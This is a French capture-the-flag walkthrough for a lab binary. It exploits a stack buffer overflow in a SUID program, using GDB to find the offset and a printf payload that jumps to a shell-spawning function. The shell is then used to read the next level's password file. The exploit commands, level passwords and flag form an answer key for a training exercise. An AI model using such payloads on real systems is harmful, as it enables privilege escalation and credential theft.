# Level1 - Walkthrough

## Objectif
Exploiter un buffer overflow pour exécuter la fonction `run()`.

---

## Étape 1 : Connexion

```bash
ssh level1@localhost -p 4242
# Mot de passe : 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```

---

## Étape 2 : Reconnaissance

```bash
ls -la
```

Observer le binaire `level1` avec le bit SUID (level2).

Tester le programme :
```bash
./level1
test
# Aucune réponse

python -c "print('A' * 100)" | ./level1
# Segmentation fault → Buffer overflow détecté
```

---

## Étape 3 : Analyse avec GDB

### Trouver l'adresse de la fonction run

```bash
gdb level1
(gdb) info functions
```

Résultat : `0x08048444  run`

### Trouver l'offset

```bash
(gdb) run
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
^D

# Si EIP = 0x42424242 (BBBB) → offset = 76
```

---

## Étape 4 : Construction du payload

Structure :
- 76 octets de padding (buffer)
- 4 octets : adresse de `run` en little-endian

Adresse de `run` : `0x08048444`  
En little-endian : `\x44\x84\x04\x08`

---

## Étape 5 : Exploitation

```bash
(printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x44\x84\x04\x08'; cat) | ./level1
```

Le programme affiche "Good... Wait what?!" et ouvre un shell.

```bash
cat /home/user/level2/.pass
```

---

## Étape 6 : Passer au niveau suivant

```bash
exit
su level2
# Mot de passe : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

---

## Flag
```
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
